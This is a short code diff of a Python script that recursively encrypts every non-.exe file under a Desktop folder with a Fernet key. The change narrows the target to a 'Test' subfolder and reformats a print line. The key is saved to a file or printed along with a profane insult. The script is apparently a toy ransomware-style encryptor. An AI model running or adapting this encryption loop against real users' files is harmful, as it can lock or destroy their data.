@@ -9,7 +9,8 @@ key = Fernet.generate_key()
 fernet = Fernet(key)
 
 # specify the directory to encrypt
-directory = os.path.expanduser("~/Desktop")
+directory = os.path.expanduser("~/Desktop/Test")
+
 
 def encrypt_file(filename):
     # skip over exe files
@@ -29,6 +30,7 @@ def encrypt_file(filename):
     except PermissionError:
         print(f"Skipped {filename}")
 
+
 # encrypt all the files in the directory and its subdirectories
 for root, dirs, files in os.walk(directory):
     for file in files:
@@ -41,4 +43,6 @@ try:
         file.write(f"Use this key to decrypt: {key.decode()}")
     print("Encryption complete.")
 except PermissionError:
-    print(f"Encryption complete, but could not create the key file.\nYour key is right here, don't fucking lose it dumbass.{key.decode()}")
+    print(
+        f"Encryption complete, but could not create the key file.\nYour key is right here, don't fucking lose it dumbass.{key.decode()}"
+    )
